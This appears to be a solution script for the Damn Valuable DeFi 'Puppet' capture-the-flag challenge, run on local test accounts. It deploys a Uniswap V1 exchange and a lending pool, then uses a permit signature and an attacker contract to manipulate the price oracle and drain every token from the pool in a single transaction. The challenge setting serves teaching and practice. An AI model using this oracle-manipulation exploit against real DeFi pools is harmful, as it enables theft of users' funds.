from ape import accounts, project
from ..utils.helper import (
    w3,
    set_balance,
    get_timestamp,
    deploy_uniswap_contract,
    create_permit_signature,
)
from decimal import Decimal

# Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
UNISWAP_INITIAL_TOKEN_RESERVE = w3.to_wei(10, "ether")
UNISWAP_INITIAL_ETH_RESERVE = w3.to_wei(10, "ether")

ATTACKER_INITAL_TOKEN_BALANCE = w3.to_wei(1000, "ether")
ATTACKER_INITIAL_ETH_BALANCE = w3.to_wei(25, "ether")

POOL_INITIAL_TOKEN_BALANCE = w3.to_wei(100000, "ether")


# Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
def calculate_token_to_eth_input_price(
    tokens_sold, tokens_in_reserve, ether_in_reserve
):
    return (
        Decimal(tokens_sold)
        * 997
        * ether_in_reserve
        // (tokens_in_reserve * 1000 + tokens_sold * 997)
    )


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # set attacker to have a balance of 25 ether
    print("\n--- Setting initial balance of attacker to 25 ether ---\n")
    set_balance(attacker, ATTACKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTACKER_INITIAL_ETH_BALANCE

    # Deploy token to be traded in Uniswap
    print("\n--- Deploying Token ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)

    # Deploy an exchange that will be used as the factory template
    print("\n--- Deploying an exchange that will be used as factory template ---\n")
    exchange_template = deploy_uniswap_contract("UniswapExchangeV1", deployer)

    # Deploy factory, initializing it with the address of the template exchange
    print("\n--- Deploying and initializing factory ---\n")
    uniswap_factory = deploy_uniswap_contract("UniswapFactoryV1", deployer)
    uniswap_factory.initializeFactory(exchange_template, sender=deployer)

    # Create a new exchange for the token and retrieve the deployed exchange's address
    print("\n--- Creating an exchange for our token ---\n")
    tx = uniswap_factory.createExchange(token, sender=deployer)
    exchange = project.UniswapExchangeV1.at("0x" + tx.logs[0]["topics"][2].hex()[26:])

    # Deploy the lending pool
    print("\n--- Deploying lending pool ---\n")
    lending_pool = project.PuppetPool.deploy(
        token,
        exchange,
        sender=deployer,
    )

    # Add initial token and ETH liquidity to the pool
    print("\n--- Adding liquidity to the exchange ---\n")
    token.approve(exchange, UNISWAP_INITIAL_TOKEN_RESERVE, sender=deployer)
    exchange.addLiquidity(
        0,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        get_timestamp() * 2,
        value=UNISWAP_INITIAL_ETH_RESERVE,
        sender=deployer,
    )

    # Ensure exchange is working as expected
    print("\n--- Testing if the exchange is working correctly... ---\n")

    assert exchange.getTokenToEthInputPrice(
        w3.to_wei(1, "ether"), sender=deployer
    ).return_value == calculate_token_to_eth_input_price(
        w3.to_wei(1, "ether"),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE,
    )

    # Set up initial token balances of pool and Attacker
    print("\n--- Setting up initial balances of the lending pool and attacker ---\n")
    token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE, sender=deployer)
    token.transfer(lending_pool, POOL_INITIAL_TOKEN_BALANCE, sender=deployer)

    # Ensure correct set up of pool. For example, to borrow 1 need to deposit 2
    print("\n--- Testing if the pool is configured properly... ---\n")
    assert lending_pool.calculateDepositRequired(w3.to_wei(1, "ether")) == w3.to_wei(
        2, "ether"
    )

    assert (
        lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        == POOL_INITIAL_TOKEN_BALANCE * 2
    )

    # define initial balances for pool and attacker
    pool_initial_bal = token.balanceOf(lending_pool) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # to do this all in a single transaction we will use the `permit()` function
    # and execute all attack logic in the constructor of our attack contract
    amount = token.balanceOf(attacker)
    current_nonce = token.nonces(attacker)
    deadline = get_timestamp() * 2
    domain_separator = token.DOMAIN_SEPARATOR()
    v, r, s = create_permit_signature(
        attacker,
        amount,
        current_nonce,
        deadline,
        domain_separator,
    )
    # deploy attacker contract
    project.PuppetAttacker.deploy(
        token,
        exchange,
        lending_pool,
        deadline,
        v,
        r,
        s,
        value="24.9 ether",
        sender=attacker,
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker has stolen all the tokens in the pool ---\n")

    pool_ending_bal = token.balanceOf(lending_pool) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    # attacker exectued exploit in a single transaction
    # use permit function to execute everything in one transaction
    assert attacker.nonce == 1

    # attacker has taken all tokens from pool
    assert token.balanceOf(lending_pool) == 0
    assert token.balanceOf(attacker) >= POOL_INITIAL_TOKEN_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
